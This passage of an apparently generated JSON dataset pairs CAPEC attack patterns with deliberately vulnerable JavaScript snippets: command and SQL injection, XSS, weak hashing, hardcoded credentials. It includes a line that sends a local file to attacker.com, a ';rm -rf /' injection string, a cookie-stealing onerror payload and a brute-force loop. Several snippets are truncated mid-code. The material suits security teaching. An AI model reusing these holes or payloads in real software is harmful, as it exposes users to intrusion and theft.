        "code_snippet": "// Server-side code\napp.post('/login', (req, res) => {\n  const user = authenticateUser(req.body);\n  if (user) {\n    // Create session token without proper integrity checks\n    const userToken = Buffer.from(JSON.stringify({\n      id: user.id,\n      role: user.role,\n      balance: user.balance\n    })).toString('base64');\n    \n    // Set cookie without secure flags or encryption\n    res.cookie('session', userToken, {\n      httpOnly: false,\n      secure: false\n    });\n    res.redirect('/dashboard');\n  }\n});\n\n// Client-side handling\napp.get('/purchase', (req, res) => {\n  const sessionCookie = req.cookies.session;\n  const userData = JSON.parse(Buffer.from(sessionCookie, 'base64').toString());\n  \n  // Blindly trust client-side data without validation\n  if(userData.balance >= req.query.itemPrice) {\n    processPurchase(userData.id, req.query.itemPrice);\n  }\n});",
        "description": "This code demonstrates vulnerable session management and authorization where user data is stored in an easily manipulated base64-encoded cookie without proper integrity checks or encryption. The server blindly trusts client-provided data for critical operations like purchases, allowing attackers to modify the session cookie to manipulate user balance, role, or other sensitive information."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "// Server-side code running with elevated privileges\nconst express = require('express');\nconst { exec } = require('child_process');\nconst app = express();\n\napp.get('/execute', (req, res) => {\n    const userCommand = req.query.cmd;\n    const logFile = '/tmp/output.txt';\n    \n    // Vulnerable: directly executing user input\n    exec(`${userCommand} > ${logFile}`, (error, stdout, stderr) => {\n        if (error) {\n            res.status(500).send('Error executing command');\n            return;\n        }\n        res.send('Command executed successfully');\n    });\n});\n\napp.listen(3000);",
        "description": "This code demonstrates a vulnerable command execution endpoint that accepts user input and executes it on the system without proper sanitization. It writes the output to a publicly readable directory, allowing other users to potentially access sensitive information. The code is vulnerable to command injection as it directly incorporates user input into system commands without validation or escaping."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "function processEmailHeader(header) {\n    let parsedHeader = header.split('\\n');\n    let emailObject = {};\n    \n    for(let line of parsedHeader) {\n        if(line.includes(':')) {\n            let [key, value] = line.split(':');\n            // Vulnerable: No sanitization of meta-characters or escape sequences\n            emailObject[key] = value;\n            \n            // Vulnerable: Command execution using header values\n            if(key.toLowerCase() === 'x-custom-action') {\n                executeCommand('mail-processor ' + value);\n            }\n            \n            // Vulnerable: HTTP header injection\n            if(key.toLowerCase() === 'x-forward-to') {\n                sendToEndpoint('http://internal.mail/forward', {\n                    'X-Forwarded-Header': value\n                });\n            }\n        }\n    }\n    return emailObject;\n}\n\nfunction executeCommand(cmd) {\n    // Executes system command without proper sanitization\n    require('child_process').exec(cmd);\n}\n\nfunction sendToEndpoint(url, headers) {\n    // Sends raw headers without encoding\n    fetch(url, { headers: headers });",
        "description": "This vulnerable code processes email headers without properly sanitizing meta-characters, escape sequences, or command arguments. It allows for header injection, command injection through custom headers, and improper handling of special characters. The code directly uses unsanitized header values in command execution and HTTP requests, making it susceptible to various injection attacks."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "`function parseMIMEMessage(mimeData) {\n        let buffer = new Buffer(1024);\n        let header = mimeData.split('\\\\n')[0];\n        let contentType = header.split(':')[1] || '';\n        \n        if(contentType.includes('multipart')) {\n            let boundary = contentType.split('boundary=')[1];\n            let parts = mimeData.split(boundary);\n            \n            for(let part of parts) {\n                // Vulnerable: No size checking before copy\n                buffer.write(part);  // Potential buffer overflow\n                \n                // Vulnerable: No validation of content type\n                let partType = part.match(/Content-Type: (.*)/);\n                if(partType) {\n                    let extension = partType[1].split('/')[1];\n                    // Vulnerable: Direct use of file extension\n                    processAttachment('./attachments/file.' + extension, buffer);",
        "description": "\"A vulnerable MIME message parser that demonstrates multiple security issues including buffer overflow in MIME conversion, improper input validation of MIME content, unsafe handling of file extensions, and potential injection vulnerabilities through unvalidated content-type headers.\""
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "`function processUserInput(input) {\n        // First parser - decodes URL encoding\n        const decoded = decodeURIComponent(input);\n        \n        // Input validation - checks for dangerous commands\n        if (decoded.match(/rm|wget|curl|eval/)) {\n            return 'Invalid input detected';",
        "description": "\"This code is vulnerable to command injection through layered encoding. It processes user input through multiple parsing steps before validation, allowing an attacker to bypass security checks. For example, an input like '%72%6d%20%2Df' (URL encoded 'rm -f') would pass validation but execute a dangerous command after parsing.\""
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "function processImageFile(file) {\n    const buffer = new Buffer(1024);\n    const fileData = fs.readFileSync(file);\n    \n    // Vulnerable: No size check before copy\n    fileData.copy(buffer);\n    \n    if(file.toLowerCase().endsWith('.jpg') || file.toLowerCase().endsWith('.jpeg')) {\n        // Vulnerable: Relying only on extension\n        processJPEGImage(buffer);\n    }\n    \n    function processJPEGImage(imgBuffer) {\n        // Vulnerable: No bounds checking\n        let header = imgBuffer.slice(0);\n        let data = [];\n        \n        // Vulnerable: Potential buffer overflow\n        for(let i = 0; i <= imgBuffer.length; i++) {\n            data[i] = imgBuffer[i] + 10;\n        }\n        \n        return data;\n    }\n}",
        "description": "This code contains multiple vulnerabilities including classic buffer overflow, improper memory bounds checking, and unsafe file handling. It processes image files without proper size validation, relies solely on file extensions for verification, and performs unsafe buffer operations that could lead to memory corruption."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "function processSymlink(symlinkPath) {\n    const fs = require('fs');\n    let buffer = new Buffer(256);\n    \n    // Read symlink without size validation\n    let linkContent = fs.readlinkSync(symlinkPath);\n    \n    // Vulnerable buffer copy without bounds checking\n    for(let i = 0; i < linkContent.length; i++) {\n        buffer[i] = linkContent.charCodeAt(i);\n    }\n    \n    // Process buffer without proper validation\n    let command = 'process ' + buffer.toString();\n    require('child_process').execSync(command);\n}",
        "description": "This code demonstrates vulnerable handling of symbolic links by reading symlink content into a fixed-size buffer without proper bounds checking, potentially leading to buffer overflow. It also includes command injection vulnerability by directly using the buffer content in a shell command without proper sanitization."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "function processConfig(configData) {\n    let buffer = new Array(50);\n    let configValues = JSON.parse(configData);\n    \n    // Copy configuration values to buffer without size check\n    for(let i = 0; configValues.settings[i]; i++) {\n        buffer[i] = configValues.settings[i];\n    }\n    \n    // Process HTML tags from config\n    let htmlContent = '<div>';\n    for(let item of buffer) {\n        if(item && item.tag) {\n            htmlContent += `<${item.tag}>${item.value}</${item.tag}>`;\n        }\n    }\n    document.getElementById('output').innerHTML = htmlContent;\n}",
        "description": "This code is vulnerable to buffer overflow through maliciously crafted configuration data. It copies values into a fixed-size buffer without bounds checking and processes HTML tags without proper validation, allowing both buffer overflow and injection attacks. The loop continues until it finds a null value, potentially writing beyond array bounds."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "function processData(input) {\n    let buffer = new Buffer(100);\n    let expanded = '';\n    \n    // Expand input by repeating each character 10 times\n    for(let i = 0; i < input.length; i++) {\n        expanded += input[i].repeat(10);\n    }\n    \n    // Attempt to copy expanded data into fixed buffer without size check\n    buffer.write(expanded, 0);\n    \n    return buffer;\n}",
        "description": "This code snippet demonstrates a buffer overflow vulnerability through data expansion. It creates a fixed-size buffer but processes input data by expanding each character 10 times without checking if the expanded data will fit within the allocated buffer size. When the input string is longer than 10 characters, the expanded data will overflow the 100-byte buffer."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "function fetchUserData(input) {\n    let fileUrl = input;\n    if (!fileUrl.startsWith('http')) {\n        fileUrl = 'file://' + fileUrl;\n    }\n    fetch(fileUrl)\n        .then(response => response.text())\n        .then(data => {\n            // Send local file contents to attacker's server\n            fetch('https://attacker.com/collect?data=' + encodeURIComponent(data));\n        });\n}",
        "description": "This vulnerable code accepts a user input and attempts to fetch data from it without properly validating the URL scheme. It allows accessing local files through the file:// protocol and sends the contents to an external server. The code mishandles unexpected input types, fails to properly validate URL schemes, and exposes sensitive data through GET requests."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "const loginUser = async (username, password) => {\n  const user = await db.findOne({ username });\n  if (user) {\n    const match = password === user.password; // Plain text password comparison\n    if (match) {\n      return { success: true, token: generateToken(user) };\n    }\n  }\n  return { success: false };\n};\n\nconst attemptLogin = async () => {\n  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';\n  for (let len = 1; len <= 8; len++) {\n    for (let i = 0; i < Math.pow(chars.length, len); i++) {\n      let password = '';\n      let temp = i;\n      for (let j = 0; j < len; j++) {\n        password = chars[temp % chars.length] + password;\n        temp = Math.floor(temp / chars.length);\n      }\n      const result = await loginUser('admin', password);\n      if (result.success) {\n        console.log('Password found:', password);\n        return;\n      }\n    }\n  }\n};",
        "description": "This code demonstrates multiple security vulnerabilities including plain text password storage, no password complexity requirements, no authentication attempt limits, and susceptibility to brute force attacks. The login function performs simple string comparison on stored plain text passwords, while the bruteforce function systematically attempts every possible password combination."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "`\nfunction recoverPassword(email) {\n  const user = findUserByEmail(email);\n  if (user) {\n    // Generate weak temporary password\n    const tempPassword = Math.random().toString(36).slice(-8);\n    \n    // Store temporary password in plain text\n    user.password = tempPassword;\n    \n    // Send password via email without encryption\n    const emailContent = \\`\n      Your temporary password is: ${tempPassword",
        "description": "\"This code demonstrates multiple vulnerabilities in password recovery and reset mechanisms: it generates weak temporary passwords, stores passwords in plain text, transmits passwords via email without encryption, lacks password complexity requirements, and allows direct password recovery/storage in a retrievable format. The implementation provides no protection against password reuse attacks and fails to implement secure password storage practices.\""
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "// Service Registry Implementation\nconst serviceRegistry = {\n    services: {},\n    \n    registerService: function(name, endpoint, metadata) {\n        // No authentication or validation of service registration\n        this.services[name] = {\n            endpoint: endpoint,\n            metadata: metadata,\n            wsdl: `http://${endpoint}/service?wsdl`\n        };\n    },\n    \n    lookupService: function(name) {\n        // No validation of service lookup requests\n        return this.services[name];\n    },\n    \n    executeServiceCall: function(serviceName, params) {\n        const service = this.lookupService(serviceName);\n        if (service) {\n            // Direct use of user input in command construction\n            const command = `curl ${service.endpoint}?${params}`;\n            return eval('require(\\'child_process\\').execSync(command).toString()');\n        }\n    }\n};\n\n// Example usage with vulnerability\nserviceRegistry.registerService('payment', 'malicious-endpoint.com/api', {\n    type: 'payment',\n    version: '1.0'\n});\n\nserviceRegistry.executeServiceCall('payment', 'user_input=;rm -rf /');",
        "description": "This vulnerable code demonstrates a service registry implementation that fails to implement proper authorization checks, allows injection attacks through unvalidated input, exposes sensitive service information, and doesn't protect against malicious service registration. The registry stores service information in cleartext and executes commands without proper sanitization, allowing for command injection attacks."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "function processFileName(userInput) {\n  // File path construction with potential null byte injection\n  let filePath = './documents/' + userInput;\n  \n  // Vulnerable string comparison that doesn't handle null bytes\n  if (filePath.indexOf('.txt') !== -1) {\n    // Read file without sanitizing null bytes\n    const fileContent = readFileSync(filePath, 'ascii');\n    return fileContent;\n  }\n  return 'Invalid file';\n}",
        "description": "This code is vulnerable to null byte injection by allowing unsanitized user input to be used in file path construction. An attacker could inject a null byte (%00) to bypass the .txt extension check and potentially access unauthorized files. The code fails to properly validate and neutralize null bytes in the input, and incorrectly handles string comparisons involving special characters."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "function processUserInput(userInput) {\n  // Vulnerable filter checking for trailing slash\n  if (!userInput.endsWith('/')) {\n    return 'Invalid input: must end with slash';\n  }\n\n  // Process the input assuming it's safe\n  let filename = userInput.substring(0, userInput.length - 1);\n  \n  // Vulnerable to null byte injection\n  // Attacker can input: 'malicious\\x00safe.txt/'\n  return readFileSync(filename);\n}",
        "description": "This code is vulnerable to null byte injection through improper input validation. The function checks for a trailing slash but fails to properly validate or sanitize null bytes in the input string. An attacker can inject a null byte followed by valid content to bypass the slash check while potentially accessing unauthorized files when the string is used in file operations."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "`\n    const express = require('express');\n    const app = express();\n    const mysql = require('mysql');\n\n    const connection = mysql.createConnection({\n      host: 'localhost',\n      user: 'admin',\n      password: 'secretpass',\n      database: 'userdb'",
        "description": "\"Vulnerable web application exposing sensitive information through error messages, using GET method with sensitive queries, and susceptible to SQL injection due to unparameterized queries. Connection details are hardcoded, and detailed error information is sent to the client.\""
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "const crypto = require('crypto');\n\nfunction hashPassword(password) {\n    // Using weak MD5 hashing\n    return crypto.createHash('md5').update(password).digest('hex');\n}\n\nfunction createUser(username, password) {\n    const hashedPassword = hashPassword(password);\n    // Store in database without salt\n    db.query('INSERT INTO users (username, password) VALUES (?, ?)', \n        [username, hashedPassword]);\n}\n\nfunction authenticateUser(username, password) {\n    const hashedAttempt = hashPassword(password);\n    // Simple single-factor authentication\n    const user = db.query('SELECT * FROM users WHERE username = ? AND password = ?',\n        [username, hashedAttempt]);\n    return user != null;\n}",
        "description": "A vulnerable password storage and authentication system that uses MD5 hashing without salt, making it susceptible to rainbow table attacks. It implements single-factor authentication, uses a cryptographically weak hashing algorithm, and stores passwords without additional security measures like salting or key stretching."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "`\n// Client-side authentication check that can be easily bypassed\nclass ClientSideAuth {\n  constructor() {\n    this.isAuthenticated = false;\n    this.authToken = null;",
        "description": "\"A vulnerable implementation that relies solely on client-side authentication checks. The code demonstrates multiple security issues: authentication logic implemented entirely on the client side, sensitive credentials stored in localStorage, and security-critical checks that can be easily bypassed by modifying the client-side code or local storage values. An attacker can manipulate the isAuthenticated flag or authToken directly in the browser to gain unauthorized access.\""
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "// REST API endpoint handler\napp.get('/api/getUserData', function(req, res) {\n  let authToken = req.query.token;\n  let userId = req.query.userId;\n  \n  // Vulnerable: No proper authentication check\n  if (authToken) {\n    // Vulnerable: Sensitive data in GET query string\n    db.query(`SELECT * FROM users WHERE id = ${userId}`, function(err, userData) {\n      if (!err) {\n        // Vulnerable: Sending sensitive data without checking SSL/TLS\n        res.json({\n          ssn: userData.ssn,\n          creditCard: userData.creditCard,\n          bankAccount: userData.bankAccount\n        });\n      }\n    });\n  }\n});",
        "description": "This code demonstrates multiple vulnerabilities in a REST API endpoint: insufficient authentication verification, sensitive data exposure through GET parameters, SQL injection vulnerability, and transmission of sensitive data without proper transport security validation. The endpoint accepts an authentication token and user ID via GET parameters and returns sensitive user data without proper security controls."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/admin/deleteUser/:id', (req, res) => {\n    // No authentication or authorization check\n    const userId = req.params.id;\n    deleteUserFromDatabase(userId);\n    res.send('User deleted');\n});\n\napp.put('/api/updateUserRole', (req, res) => {\n    // Blindly trusting the role update request\n    const { userId, newRole } = req.body;\n    updateUserRole(userId, newRole);\n    res.send('Role updated');\n});\n\napp.get('/api/sensitiveData', (req, res) => {\n    // Using GET method for sensitive operation\n    // No proper privilege check\n    const data = fetchSensitiveData();\n    res.json(data);\n});",
        "description": "This code demonstrates vulnerable REST API endpoints that lack proper authentication and authorization checks. It allows unrestricted access to sensitive operations through HTTP GET/PUT methods, improperly handles privilege management, and assumes GET requests are safe for state-changing operations. The code trusts incoming requests without verifying user permissions or roles."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "`\nfunction createSessionId() {\n  // Predictable session ID generation based on timestamp\n  const timestamp = Date.now();\n  const sessionId = 'sess_' + timestamp;\n  \n  // Store session ID in persistent cookie without secure flags\n  document.cookie = 'sessionId=' + sessionId + '; path=/; expires=Thu, 31 Dec 2037 23:59:59 GMT';\n  \n  // No session validation or regeneration on authentication\n  function authenticateUser(username, password) {\n    if (username === 'admin' && password === 'password123') {\n      // Reuse existing session ID without invalidation\n      return true;",
        "description": "\"A vulnerable session management implementation that uses predictable session IDs based on timestamp, stores them in persistent cookies, lacks proper validation, and doesn't regenerate sessions upon authentication. The code is susceptible to session prediction, fixation, and hijacking attacks.\""
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\n// Store active sessions\nlet sessions = {};\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    \n    if(authenticate(username, password)) {\n        // Reusing existing session instead of generating new one\n        let sessionId = req.cookies.sessionId;\n        if(!sessionId) {\n            sessionId = 'session_' + username + '_' + Date.now();\n        }\n        \n        sessions[sessionId] = {\n            username: username,\n            isAuthenticated: true,\n            loginTime: Date.now()\n        };\n        \n        // Set persistent cookie with session info\n        res.cookie('sessionId', sessionId, {\n            expires: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000),\n            httpOnly: false\n        });\n        \n        res.json({ success: true });\n    }\n});\n\napp.get('/sensitiveData', (req, res) => {\n    const sessionId = req.cookies.sessionId;\n    if(sessions[sessionId] && sessions[sessionId].isAuthenticated) {\n        // No session expiration check\n        // No origin validation\n        res.json({ secretData: 'sensitive information' });\n    }\n});",
        "description": "This code demonstrates multiple session security vulnerabilities including session fixation, session replay attacks, and improper session validation. It fails to generate new session IDs upon authentication, uses persistent cookies with sensitive data, lacks proper session expiration, and doesn't validate request origins. The code also exposes sensitive information without proper authorization checks and maintains improper control over session resources."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "// Server-side code\napp.post('/login', (req, res) => {\n    let sessionId = req.body.sessionId || generateSessionId();\n    \n    if(authenticateUser(req.body.username, req.body.password)) {\n        // Vulnerable: Reusing provided sessionId without regeneration\n        req.session.id = sessionId;\n        req.session.isAuthenticated = true;\n        req.session.userRole = 'admin';\n        \n        res.cookie('sessionId', sessionId);\n        res.redirect('/dashboard');\n    }\n});\n\n// Client-side code\nfunction login() {\n    let fixedSessionId = 'attacker_provided_session_id';\n    fetch('/login', {\n        method: 'POST',\n        body: JSON.stringify({\n            username: 'victim',\n            password: 'password123',\n            sessionId: fixedSessionId\n        })\n    });\n}",
        "description": "This code demonstrates session fixation vulnerability by accepting client-provided session IDs during login without regenerating them after authentication. The server maintains the same session identifier before and after authentication, allowing an attacker to predict and hijack authenticated sessions. The code also shows improper session management and relies on client-side security enforcement."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "// Server-side code\napp.post('/transfer-money', function(req, res) {\n  // No CSRF token validation\n  // No additional authentication check\n  const amount = req.body.amount;\n  const toAccount = req.body.toAccount;\n  \n  // Using only session cookie for authentication\n  if (req.cookies.sessionId) {\n    // Vulnerable transfer implementation\n    executeTransfer(req.cookies.sessionId, amount, toAccount);\n    res.json({ success: true });\n  }\n});\n\n// Cookie setting with vulnerable configuration\nres.cookie('sessionId', 'user123', {\n  httpOnly: true,\n  // Missing SameSite attribute\n  // Missing secure flag\n  path: '/',\n  expires: new Date(Date.now() + 86400000)\n});",
        "description": "This code demonstrates a vulnerable money transfer endpoint that's susceptible to CSRF attacks. It lacks proper request validation, relies solely on session cookies for authentication, and sets cookies without proper security attributes. An attacker could craft a malicious link that triggers unauthorized transfers using the victim's active session."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "function displayUserComment(comment) {\n    let commentSection = document.getElementById('comments');\n    commentSection.innerHTML = comment; // Vulnerable: directly inserting user input\n}\n\nfunction addImageToGallery(imageUrl) {\n    let gallery = document.getElementById('gallery');\n    let img = `<img src='${imageUrl}' onerror='alert(document.cookie)'>`;\n    gallery.innerHTML += img;\n}\n\nfunction showError(errorMsg) {\n    let errorDiv = document.getElementById('errorMessages');\n    errorDiv.innerHTML = 'Error: ' + errorMsg;\n}",
        "description": "Vulnerable code that demonstrates multiple XSS vectors through direct DOM manipulation without proper input sanitization. Allows injection of malicious scripts through user comments, image attributes, and error messages."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "function processFileRequest(userInput) {\n    const filePath = '/protected/files/' + decodeURIComponent(userInput);\n    const fs = require('fs');\n    \n    try {\n        if (filePath.indexOf('/protected/files/') === 0) {\n            return fs.readFileSync(filePath, 'utf8');\n        }\n        return 'Access denied';\n    } catch(err) {\n        return 'Error accessing file';\n    }\n}",
        "description": "This code is vulnerable to path traversal through URL encoding manipulation. It attempts to restrict file access to a protected directory but fails to properly sanitize encoded URL input. An attacker can use various URL encoding formats (like %2e%2e%2f for '../') to bypass the directory restriction check. The basic string comparison using indexOf() is insufficient for properly validating encoded paths."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "// Client-side code to fetch and execute updates\nfunction fetchAndApplyUpdate() {\n    fetch('http://example.com/updates/patch.js')\n        .then(response => response.text())\n        .then(code => {\n            // Store sensitive configuration in plaintext\n            const config = {\n                apiKey: 'sk_live_12345',\n                userToken: 'bearer_token_xyz',\n                serverEndpoint: 'http://api.example.com'\n            };\n            \n            // Directly execute downloaded code without verification\n            eval(code);\n            \n            // Send sensitive data without encryption\n            fetch(config.serverEndpoint + '/sync', {\n                method: 'POST',\n                body: JSON.stringify(config)\n            });\n        });\n}",
        "description": "This vulnerable code demonstrates unencrypted transmission of sensitive data, downloading and executing code without verification, and storing sensitive information in plaintext. It uses HTTP instead of HTTPS, executes downloaded code using eval() without integrity checks, and transmits API keys and tokens in cleartext."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst connection = mysql.createConnection({\n    host: 'localhost',\n    user: 'root',\n    password: 'password',\n    database: 'users'\n});\n\napp.get('/user', (req, res) => {\n    let username = req.query.username;\n    let query = 'SELECT * FROM users WHERE username = \\'' + username + '\\'';\n    \n    connection.query(query, (error, results) => {\n        if (error) {\n            res.status(500).json({ error: error.stack });\n            return;\n        }\n        res.json(results);\n    });\n});\n\napp.listen(3000);",
        "description": "This code demonstrates a classic SQL injection vulnerability where user input is directly concatenated into a SQL query string without proper sanitization. The endpoint accepts a username parameter and constructs a query without input validation or parameterization. Additionally, it exposes detailed error messages that could reveal database structure. The database connection is also susceptible to cursor injection as it lacks proper connection handling."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "`\nconst net = require('net');\nconst syslog = require('syslog-client');\n\nconst client = new syslog.createClient('127.0.0.1');\n\nfunction logUserActivity(userInput) {\n    // Vulnerable: directly using user input in format string\n    client.log(userInput + ': %s %s', 'user', 'action');\n    \n    // Vulnerable: buffer overflow possible with large input\n    let buffer = Buffer.alloc(50);\n    buffer.write(userInput);  // No size check\n    \n    // Format string vulnerability combined with buffer overflow\n    let message = `${userInput",
        "description": "\"This code demonstrates a vulnerable implementation of syslog usage in Node.js, combining format string vulnerabilities with buffer overflow risks. The code accepts unchecked user input and directly uses it in syslog format strings and buffer operations without proper validation or sanitization. It allows potential format string injection and buffer overflow attacks through malicious user input.\""
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "const crypto = require('crypto');\n\nclass CodeSigning {\n    constructor() {\n        this.privateKey = 'weak_private_key';\n        this.hashAlgorithm = 'md5';\n    }\n\n    signCode(code) {\n        // Weak hash algorithm (MD5)\n        const hash = crypto.createHash(this.hashAlgorithm);\n        hash.update(code);\n        // Missing proper cryptographic steps\n        return hash.digest('hex');\n    }\n\n    verifySignature(code, signature) {\n        // Optimization flag that bypasses verification\n        const BYPASS_VERIFICATION = true;\n        if (BYPASS_VERIFICATION) {\n            return true;\n        }\n\n        const hash = crypto.createHash(this.hashAlgorithm);\n        hash.update(code);\n        return hash.digest('hex') === signature;\n    }\n\n    executeSignedCode(code, signature) {\n        if (this.verifySignature(code, signature)) {\n            // Potential execution of malicious code\n            return eval(code);\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable code signing implementation using weak cryptographic practices (MD5 hash), missing crucial cryptographic steps, bypassing signature verification, and potential execution of malicious code through eval(). The implementation lacks proper root of trust and can be easily compromised due to weak verification mechanisms."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "const app = require('express')();\nconst { exec } = require('child_process');\n\napp.get('/admin/system', (req, res) => {\n  if(req.query.command) {\n    // Elevated privileges used without proper checks\n    process.env.SUDO_ALLOWED = 'true';\n    \n    // Dangerous system configuration from external input\n    exec(`sudo ${req.query.command}`, (error, stdout) => {\n      res.send(stdout);\n    });\n  }\n});\n\napp.listen(3000);",
        "description": "Vulnerable code that executes OS commands with elevated privileges based on user input without proper validation or sanitization. The code sets sudo permissions through environment variables and directly executes system commands from URL parameters, allowing command injection and privilege escalation."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "const users = {\n  'admin': 'admin',\n  'root': '',\n  'system': 'password123',\n  'guest': 'guest'\n};\n\nfunction authenticateUser(username, password) {\n  if (users[username] === password) {\n    return { authenticated: true, token: 'static_token_123' };\n  }\n  return { authenticated: false };\n}\n\nfunction resetPassword(username, newPassword) {\n  if (newPassword.length >= 1) {\n    users[username] = newPassword;\n    return true;\n  }\n  return false;\n}",
        "description": "Vulnerable authentication system using hardcoded credentials, weak password requirements, single-factor authentication, and no password aging mechanism. The system accepts common/default passwords and has no minimum length or complexity requirements."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "function validateUserInput(input) {\n    // Basic input validation before encoding\n    if (input.match(/[<>\"']/)) {\n        return false;\n    }\n\n    // Convert input to Unicode normalized form\n    const normalizedInput = input.normalize('NFKC');\n\n    // Simple allowlist of characters\n    const allowedChars = /^[a-zA-Z0-9\\s]+$/;\n    if (allowedChars.test(normalizedInput)) {\n        // Process the input without considering other Unicode representations\n        document.getElementById('output').innerHTML = normalizedInput;\n        return true;\n    }\n    return false;\n}\n\n// Usage\nconst userInput = '＜script＞alert(1)＜/script＞';\nvalidateUserInput(userInput);",
        "description": "This vulnerable code attempts to validate user input but fails to properly handle Unicode encodings. It validates the input before normalization and uses an incomplete allowlist that doesn't account for various Unicode representations of characters. An attacker could bypass the validation using fullwidth Unicode characters or other alternate encodings. The code also directly inserts the input into innerHTML without proper encoding, potentially leading to XSS attacks."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "function downloadFile(userInput) {\n    // Get file path from user input\n    let filePath = userInput;\n    \n    // Attempt to decode URL-encoded input without proper validation\n    let decodedPath = decodeURIComponent(filePath);\n    \n    // Directly use the decoded path to read file\n    const fs = require('fs');\n    try {\n        let fileContent = fs.readFileSync(decodedPath);\n        return fileContent;\n    } catch(err) {\n        console.error('Error reading file:', err);\n    }\n}",
        "description": "This code demonstrates vulnerable URL encoding handling by accepting user input for a file path, decoding it without proper validation, and using it directly in filesystem operations. It's vulnerable to directory traversal through encoded characters (e.g., %2e%2e%2f for '../') and path manipulation attacks."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "function saveUserFile(filename) {\n    // Store user-uploaded file with provided filename\n    let userPath = 'uploads/' + filename;\n    let fileLink = '<a href=\"' + userPath + '\">' + filename + '</a>';\n    \n    // Append file link to downloads section without sanitization\n    document.getElementById('downloads').innerHTML += fileLink;\n\n    // Store filename in database\n    storeFileRecord({\n        name: filename,\n        path: userPath,\n        uploaded: new Date().toISOString()\n    });\n}",
        "description": "This vulnerable code accepts a user-provided filename and directly injects it into HTML without proper sanitization. An attacker could provide a filename containing malicious JavaScript code (e.g., '<img src=x onerror=alert(1)>.jpg') which would be executed when the link is rendered in the browser, enabling XSS attacks."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "`\n    class UserStateManager {\n      constructor() {\n        this.userStates = {",
        "description": "\"This vulnerable code demonstrates state management issues including improper state transitions, cleartext storage of sensitive data in cookies, missing integrity checks, and incomplete state reset functionality. The code allows manipulation of user states without proper validation, stores authentication tokens insecurely, and fails to properly verify state transitions in financial transactions.\""
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "// Config file parser\nconst configPath = process.argv[2] || './config.json';\nconst fs = require('fs');\n\nfunction loadAndExecuteConfig(configPath) {\n    let configData = fs.readFileSync(configPath, 'utf8');\n    let config = JSON.parse(configData);\n    \n    if (config.commands) {\n        config.commands.forEach(cmd => {\n            // Directly executing commands from config without validation\n            require('child_process').execSync(cmd);\n        });\n    }\n\n    if (config.includes) {\n        // Blindly loading additional config files\n        config.includes.forEach(includePath => {\n            let additionalConfig = fs.readFileSync(includePath, 'utf8');\n            Object.assign(config, JSON.parse(additionalConfig));\n        });\n    }\n    return config;\n}\n\n// Load and execute without origin or integrity validation\nloadAndExecuteConfig(configPath);",
